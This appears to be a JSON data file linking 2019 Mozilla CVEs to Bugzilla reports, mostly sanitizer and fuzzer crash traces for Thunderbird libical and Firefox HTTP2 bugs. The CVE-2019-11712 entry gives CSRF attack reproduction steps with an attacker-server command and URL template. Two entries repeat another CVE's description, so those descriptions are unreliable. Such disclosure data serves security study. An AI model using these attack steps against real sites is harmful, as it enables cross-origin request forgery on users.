(/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x422083) #3 0x7f0d4197f88f (/lib/x86_64-linux-gnu/libpthread.so.0+0x1288f) #4 0x7f0d40bf8e96 in __libc_signal_restore_set /build/glibc-OTsEL5/glibc-2.27/signal/../sysdeps/unix/sysv/linux/nptl-signals.h:80 #5 0x7f0d40bf8e96 in raise /build/glibc-OTsEL5/glibc-2.27/signal/../sysdeps/unix/sysv/linux/raise.c:48 #6 0x7f0d40bfa800 in abort /build/glibc-OTsEL5/glibc-2.27/stdlib/abort.c:79 #7 0x7f0d40c4da90 in __malloc_assert /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:298 #8 0x7f0d40c4da90 in sysmalloc /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:2398 #9 0x7f0d40c4efef in _int_malloc /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:4125 #10 0x7f0d40c512ec in malloc /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:3065 #11 0x479131 in pvl_new_element /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/pvl.c:118:36 #12 0x47930f in pvl_push /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/pvl.c:194:28 #13 0x46c7e7 in icalproperty_add_parameters /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalproperty.c:87:6 #14 0x48c215 in icalproperty_vanew_xlicerror /opt/src/thunderbird-60.6.1/obj-x86_64-pc-linux-gnu/comm/calendar/libical/src/libical/icalderivedproperty.c:3214:4 #15 0x46b240 in insert_error /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:584:3 #16 0x46ae75 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:883:3 #17 0x46a3fd in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #18 0x45de8a in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #19 0x45c8f4 in LLVMFuzzerTestOneInput (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x45c8f4) #20 0x4235a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x4235a1) #21 0x40d247 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x40d247) #22 0x4133e1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x4133e1) #23 0x43ce82 in main (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x43ce82) #24 0x7f0d40bdbb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #25 0x406b69 in _start (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x406b69) free(): invalid next size (fast) ==10502== ERROR: libFuzzer: deadly signal #0 0x45c5b0 in __sanitizer_print_stack_trace (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x45c5b0) #1 0x43c61b in fuzzer::PrintStackTrace() (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x43c61b) #2 0x422083 in fuzzer::Fuzzer::CrashCallback() (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x422083) #3 0x7f40bfdd888f (/lib/x86_64-linux-gnu/libpthread.so.0+0x1288f) #4 0x7f40bf051e96 in __libc_signal_restore_set /build/glibc-OTsEL5/glibc-2.27/signal/../sysdeps/unix/sysv/linux/nptl-signals.h:80 #5 0x7f40bf051e96 in raise /build/glibc-OTsEL5/glibc-2.27/signal/../sysdeps/unix/sysv/linux/raise.c:48 #6 0x7f40bf053800 in abort /build/glibc-OTsEL5/glibc-2.27/stdlib/abort.c:79 #7 0x7f40bf09c896 in __libc_message /build/glibc-OTsEL5/glibc-2.27/libio/../sysdeps/posix/libc_fatal.c:181 #8 0x7f40bf0a3909 in malloc_printerr /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:5350 #9 0x7f40bf0aaf5f in _int_free /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:4213 #10 0x7f40bf0aaf5f in free /build/glibc-OTsEL5/glibc-2.27/malloc/malloc.c:3124 #11 0x45e3f9 in icalproperty_free /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalproperty.c:253:2 #12 0x45e224 in icalcomponent_free /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalcomponent.c:262:6 #13 0x469d5b in icalparser_free /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:170:2 #14 0x45def4 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1240:5 #15 0x45c8f4 in LLVMFuzzerTestOneInput (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x45c8f4) #16 0x4235a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x4235a1) #17 0x40d247 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x40d247) #18 0x4133e1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x4133e1) #19 0x43ce82 in main (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x43ce82) #20 0x7f40bf034b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #21 0x406b69 in _start (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x406b69) Expected results: No heap overflow nor corruption. When the vulnerable function in Thunderbird is replaced with current implementation in libical upstream (https://github.com/libical/libical/blob/master/src/libical/icalvalue.c#L170) this bug doesn't manifest anymore."
      }
    ],
    "CVE-2019-11705": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1553808",
        "title": "Stack buffer overflow in icalrecur.c icalrecur_add_bydayrules",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: Open the attached saved message (stack-overflow-submit.eml) in Thunderbird. Receiving this message in my inbox also triggers the bug without further user interaction. The thunderbird process is killed. Actual results: A stack buffer overflow happens when loading the attached file. An specially crafted text/calendar mail attachment triggers a stack buffer overflow write in icalrecur_add_bydayrules. $ thunderbird stack-overflow-submit.eml [calBackendLoader] Using Thunderbird's builtin libical backend *** stack smashing detected ***: <unknown> terminated Aborted (core dumped ==4191==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff695fb968 at pc 0x00000051e8cb bp 0x7fff695fad50 sp 0x7fff695fad48 WRITE of size 2 at 0x7fff695fb968 thread T0 #0 0x51e8ca in icalrecur_add_bydayrules /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalrecur.c:409:22 #1 0x51f5b0 in icalrecurrencetype_from_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalrecur.c:481:6 #2 0x535554 in icalvalue_new_from_string_with_error /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:615:11 #3 0x519251 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1075:14 #4 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #5 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #6 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #7 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #8 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #9 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #10 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #11 0x7f85ccd8ab96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #12 0x41dc49 in _start (/opt/libfuzzer/thunderbird_libical_fuzzer+0x41dc49) Address 0x7fff695fb968 is located in stack of thread T0 at offset 2824 in frame #0 0x51ed23 in icalrecurrencetype_from_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalrecur.c:420 This frame has 2 object(s): [32, 2824) 'parser' (line 421) <== Memory access at offset 2824 overflows this variable [2960, 3008) 'tmp' (line 462) Expected results: No stack overflow."
      }
    ],
    "CVE-2019-11708": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1559858",
        "title": "Sending `Prompt:Open` from the child allows for a sandbox escape",
        "description": "A successful exploit in the child process, my use the messageManager to request itself (or really any URL) being opened in the parent process with the Prompt:Open message. This allows for running the exploit again and thus bypassing the sandbox."
      }
    ],
    "CVE-2019-11709": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1547266%2C1540759%2C1548822%2C1550498%2C1515052%2C1539219%2C1547757%2C1550498%2C1533522",
        "description": "A successful exploit in the child process, my use the messageManager to request itself (or really any URL) being opened in the parent process with the Prompt:Open message. This allows for running the exploit again and thus bypassing the sandbox."
      }
    ],
    "CVE-2019-11710": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1549768%2C1548611%2C1533842%2C1537692%2C1540590%2C1551907%2C1510345%2C1535482%2C1535848%2C1547472%2C1547760%2C1507696%2C1544180",
        "description": "A successful exploit in the child process, my use the messageManager to request itself (or really any URL) being opened in the parent process with the Prompt:Open message. This allows for running the exploit again and thus bypassing the sandbox."
      }
    ],
    "CVE-2019-11712": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1543804",
        "title": "Cross-origin requests can be made with NPAPI plugins by following 308 redirects",
        "description": "Cross-origin requests can be made with NPAPI plugins such as Flash which can allow an attacker to perform Cross-Site Request Forgery attacks using otherwise inaccessible HTTP headers such as Content-Type. This can be achieved by sending a request to an attacker controlled server (same-origin request) which will then respond with a 308 redirect with the “Location” header set to the target origin/vulnerable endpoint. Once the browser receives this 308 redirect, the request is made to the cross-origin endpoint, and in Flash’s case, an immediate request for the target endpoints crossdomain.xml file is requested. However, since the browser has already responded to the 308 redirect, CORS has been violated. Reproduction Steps: A modular exploit has been attached including: csrf.html, csrf.as, and firefoxHttpRedirector.py. On a web server under your control, run the firefoxHttpRedirector.py script in the same folder as the csrf.html and compiled flash applet (csrf.swf) files. The command would look something like: sudo python firefoxHttpRedirector.py --port 80 --target https://vulnerableapp123.com/api/endpoint Then, once the web server has started, emulate a victim by constructing a CSRF request in the following format: http://<attack_server>/csrf.html?attackerUrl=http://<attack_server>/&md=POST&jsonData={“foo”:”bar”}&headers=Content-Type:application/json Where the URL parameters are as follows: attackerUrl - server where the firefoxHttpRedirector.py script is running md - HTTP method/verb to use in the request to the target server (GET or POST) jsonData - body data to be sent to the target server (the parameter is jsonData but any format would work) headers - headers to include in the request, such as Content-Type Once the appropriate URL has been constructed, navigate to that URL and note how Firefox follows the redirection to the target server with the body and headers intact. I have setup an attack server which can be used as a PoC upon request. Currently I have it configured to be inaccessible however if there’s issues setting up the exploit, I can provide that URL. Expected behavior: Firefox does not follow the 308 redirect or waits for a CORS evaluation before following the redirect. Observed behavior: Firefox follows the 308 redirect. Tested versions: Firefox 66.0.3 x64 (Windows 7 6.1.7601) Firefox 66.0.2 x64 (Windows 10 10.0.17134) Firefox ESR 60.6.1esr x64 (macOS Sierra 10.12.6) References: https://bugzilla.mozilla.org/show_bug.cgi?id=1436241 https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b https://github.com/sp1d3r/swf_json_csrf"
      }
    ],
    "CVE-2019-11713": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1528481",
        "title": "use after free in HTTP2 code, mozilla::net::Http2Session::RecvPushPromise (Http2Session.cpp)",
        "description": "I observed a use after free in the HTTP2 code with the optimized ASAN builds. From the line numbers the bug should be somewhere in Http2Session.cpp between line 2049 and 2016: if (NS_FAILED(ds->AsyncOpenURI( pushedURL, EmptyCString(), nsICacheStorage::OPEN_READONLY | nsICacheStorage::OPEN_SECRETLY, cpcc))) { LOG3( (\"Http2Session::RecvPushPromise %p failed to open cache entry for \" \"push check\", self)); } } } pushedStream->SetHTTPState(Http2Stream::RESERVED_BY_REMOTE); Stack trace: ==18805==ERROR: AddressSanitizer: heap-use-after-free on address 0x61400042eebc at pc 0x7f4330719163 bp 0x7f42e6c19410 sp 0x7f42e6c19408 WRITE of size 4 at 0x61400042eebc thread T8 (Socket Thread) #0 0x7f4330719162 in SetHTTPState /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Stream.h:62:45 #1 0x7f4330719162 in mozilla::net::Http2Session::RecvPushPromise(mozilla::net::Http2Session*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:2061 #2 0x7f43307284c2 in mozilla::net::Http2Session::WriteSegmentsAgain(mozilla::net::nsAHttpSegmentWriter*, unsigned int, unsigned int*, bool*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:3556:10 #3 0x7f43308c9cb5 in mozilla::net::nsHttpConnection::OnSocketReadable() /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2076:24 #4 0x7f43308cc897 in mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2419:17 #5 0x7f43308cd0ec in non-virtual thunk to mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp #6 0x7f432ff33538 in mozilla::net::nsSocketInputStream::OnSocketReady(nsresult) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:277:27 #7 0x7f432ff42b13 in mozilla::net::nsSocketTransport::OnSocketReady(PRFileDesc*, short) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:2185:14 #8 0x7f432ff53b01 in mozilla::net::nsSocketTransportService::DoPollIteration(mozilla::BaseTimeDuration<mozilla::TimeDurationValueCalculator>*) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #9 0x7f432ff51c95 in mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:972:7 #10 0x7f432ff5417c in non-virtual thunk to mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #11 0x7f432fcbf3d6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1162:14 #12 0x7f432fcc56c8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:474:10 #13 0x7f4330c4e28a in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #14 0x7f4330b94d8f in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #15 0x7f4330b94d8f in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #16 0x7f4330b94d8f in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #17 0x7f432fcb958a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:449:11 #18 0x7f4350751666 in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #19 0x7f43503956da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da) #20 0x7f434f37388e in clone /build/glibc-OTsEL5/glibc-2.27/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:95 0x61400042eebc is located 124 bytes inside of 440-byte region [0x61400042ee40,0x61400042eff8) freed by thread T8 (Socket Thread) here: #0 0x55eef3d2b5d2 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7f432fb6e497 in RawRemove /builds/worker/workspace/build/src/xpcom/ds/PLDHashTable.cpp:637:3 #2 0x7f432fb6e497 in RawRemove /builds/worker/workspace/build/src/xpcom/ds/PLDHashTable.cpp:621 #3 0x7f432fb6e497 in PLDHashTable::RemoveEntry(PLDHashEntryHdr*) /builds/worker/workspace/build/src/xpcom/ds/PLDHashTable.cpp:615 #4 0x7f4330709f50 in RemoveEntry /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTHashtable.h:214:48 #5 0x7f4330709f50 in Remove /builds/worker/workspace/build/src/obj-firefox/dist/include/nsBaseHashtable.h:184 #6 0x7f4330709f50 in mozilla::net::Http2Session::CleanupStream(mozilla::net::Http2Stream*, nsresult, mozilla::net::Http2Session::errorType) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:1243 #7 0x7f433071b294 in CleanupStream /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:1262:3 #8 0x7f433071b294 in mozilla::net::Http2Session::CachePushCheckCallback::OnCacheEntryCheck(nsICacheEntry*, nsIApplicationCache*, unsigned int*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:2224 #9 0x7f4330586ede in mozilla::net::CacheEntry::InvokeCallback(mozilla::net::CacheEntry::Callback&) /builds/worker/workspace/build/src/netwerk/cache2/CacheEntry.cpp:741:46 #10 0x7f4330585faf in mozilla::net::CacheEntry::InvokeCallbacks(bool) /builds/worker/workspace/build/src/netwerk/cache2/CacheEntry.cpp:668:30 #11 0x7f4330581650 in mozilla::net::CacheEntry::InvokeCallbacks() /builds/worker/workspace/build/src/netwerk/cache2/CacheEntry.cpp:610:31 #12 0x7f433057f3eb in Open /builds/worker/workspace/build/src/netwerk/cache2/CacheEntry.cpp:340:3 #13 0x7f433057f3eb in mozilla::net::CacheEntry::AsyncOpen(nsICacheEntryOpenCallback*, unsigned int) /builds/worker/workspace/build/src/netwerk/cache2/CacheEntry.cpp:315 #14 0x7f433057a695 in mozilla::net::CacheStorage::AsyncOpenURI(nsIURI*, nsTSubstring<char> const&, unsigned int, nsICacheEntryOpenCallback*) /builds/worker/workspace/build/src/netwerk/cache2/CacheStorage.cpp:105:19 #15 0x7f4330718463 in mozilla::net::Http2Session::RecvPushPromise(mozilla::net::Http2Session*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:2049:11 #16 0x7f43307284c2 in mozilla::net::Http2Session::WriteSegmentsAgain(mozilla::net::nsAHttpSegmentWriter*, unsigned int, unsigned int*, bool*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:3556:10 #17 0x7f43308c9cb5 in mozilla::net::nsHttpConnection::OnSocketReadable() /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2076:24 #18 0x7f43308cc897 in mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2419:17 #19 0x7f43308cd0ec in non-virtual thunk to mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp #20 0x7f432ff33538 in mozilla::net::nsSocketInputStream::OnSocketReady(nsresult) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:277:27 #21 0x7f432ff42b13 in mozilla::net::nsSocketTransport::OnSocketReady(PRFileDesc*, short) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:2185:14 #22 0x7f432ff53b01 in mozilla::net::nsSocketTransportService::DoPollIteration(mozilla::BaseTimeDuration<mozilla::TimeDurationValueCalculator>*) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #23 0x7f432ff51c95 in mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:972:7 #24 0x7f432ff5417c in non-virtual thunk to mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #25 0x7f432fcbf3d6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1162:14 #26 0x7f432fcc56c8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:474:10 #27 0x7f4330c4e28a in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #28 0x7f4330b94d8f in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #29 0x7f4330b94d8f in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #30 0x7f4330b94d8f in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #31 0x7f432fcb958a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:449:11 #32 0x7f4350751666 in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #33 0x7f43503956da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da) previously allocated by thread T8 (Socket Thread) here: #0 0x55eef3d2b953 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x55eef3d6017d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7f4330716ec2 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7f4330716ec2 in mozilla::net::Http2Session::RecvPushPromise(mozilla::net::Http2Session*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:1913 #4 0x7f43307284c2 in mozilla::net::Http2Session::WriteSegmentsAgain(mozilla::net::nsAHttpSegmentWriter*, unsigned int, unsigned int*, bool*) /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Session.cpp:3556:10 #5 0x7f43308c9cb5 in mozilla::net::nsHttpConnection::OnSocketReadable() /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2076:24 #6 0x7f43308cc897 in mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp:2419:17 #7 0x7f43308cd0ec in non-virtual thunk to mozilla::net::nsHttpConnection::OnInputStreamReady(nsIAsyncInputStream*) /builds/worker/workspace/build/src/netwerk/protocol/http/nsHttpConnection.cpp #8 0x7f432ff33538 in mozilla::net::nsSocketInputStream::OnSocketReady(nsresult) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:277:27 #9 0x7f432ff42b13 in mozilla::net::nsSocketTransport::OnSocketReady(PRFileDesc*, short) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransport2.cpp:2185:14 #10 0x7f432ff53b01 in mozilla::net::nsSocketTransportService::DoPollIteration(mozilla::BaseTimeDuration<mozilla::TimeDurationValueCalculator>*) /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #11 0x7f432ff51c95 in mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:972:7 #12 0x7f432ff5417c in non-virtual thunk to mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #13 0x7f432fcbf3d6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1162:14 #14 0x7f432fcc56c8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:474:10 #15 0x7f4330c4e28a in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #16 0x7f4330b94d8f in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #17 0x7f4330b94d8f in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #18 0x7f4330b94d8f in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #19 0x7f432fcb958a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:449:11 #20 0x7f4350751666 in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #21 0x7f43503956da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da) Thread T8 (Socket Thread) created by T0 here: #0 0x55eef3d1426d in __interceptor_pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7f435074e395 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7f435074df7e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7f432fcbb889 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:655:8 #4 0x7f432fcc4810 in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:414:12 #5 0x7f432fcc8549 in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:127:57 #6 0x7f432ff4f9bc in NS_NewNamedThread<14> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7f432ff4f9bc in mozilla::net::nsSocketTransportService::Init() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:608 #8 0x7f432fc52dc2 in mozilla::xpcom::CreateInstanceImpl(mozilla::xpcom::ModuleID, nsISupports*, nsID const&, void**) /builds/worker/workspace/build/src/obj-firefox/xpcom/components/StaticComponents.cpp:5349:7 #9 0x7f432fc75fdf in CreateInstance /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:220:46 #10 0x7f432fc75fdf in nsComponentManagerImpl::GetServiceLocked((anonymous namespace)::MutexLock&, (anonymous namespace)::EntryWrapper&, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1396 #11 0x7f432fc6b03c in nsComponentManagerImpl::GetServiceByContractID(char const*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1583:10 #12 0x7f432fc7ecd5 in CallGetService /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:61:43 #13 0x7f432fc7ecd5 in nsGetServiceByContractIDWithError::operator()(nsID const&, void**) const /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:253 #14 0x7f432fb069be in nsCOMPtr_base::assign_from_gs_contractid_with_error(nsGetServiceByContractIDWithError const&, nsID const&) /builds/worker/workspace/build/src/xpcom/base/nsCOMPtr.cpp:91:7 #15 0x7f432fe9d9dd in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:746:5 #16 0x7f432fe9d9dd in InitializeSocketTransportService /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:306 #17 0x7f432fe9d9dd in mozilla::net::nsIOService::SetOffline(bool) /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:1127 #18 0x7f432fe9c4da in mozilla::net::nsIOService::Init() /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:271:3 #19 0x7f432fe9f91e in mozilla::net::nsIOService::GetInstance() /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:362:9 #20 0x7f432fc536b6 in mozilla::xpcom::CreateInstanceImpl(mozilla::xpcom::ModuleID, nsISupports*, nsID const&, void**) /builds/worker/workspace/build/src/obj-firefox/xpcom/components/StaticComponents.cpp:5367:48 #21 0x7f432fc75fdf in CreateInstance /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:220:46 #22 0x7f432fc75fdf in nsComponentManagerImpl::GetServiceLocked((anonymous namespace)::MutexLock&, (anonymous namespace)::EntryWrapper&, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1396 #23 0x7f432fc6b03c in nsComponentManagerImpl::GetServiceByContractID(char const*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1583:10 #24 0x7f4331d88821 in CallGetService<nsIIOService> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsServiceManagerUtils.h:73:10 #25 0x7f4331d88821 in nsScriptSecurityManager::Init() /builds/worker/workspace/build/src/caps/nsScriptSecurityManager.cpp:1405 #26 0x7f4331d8974c in 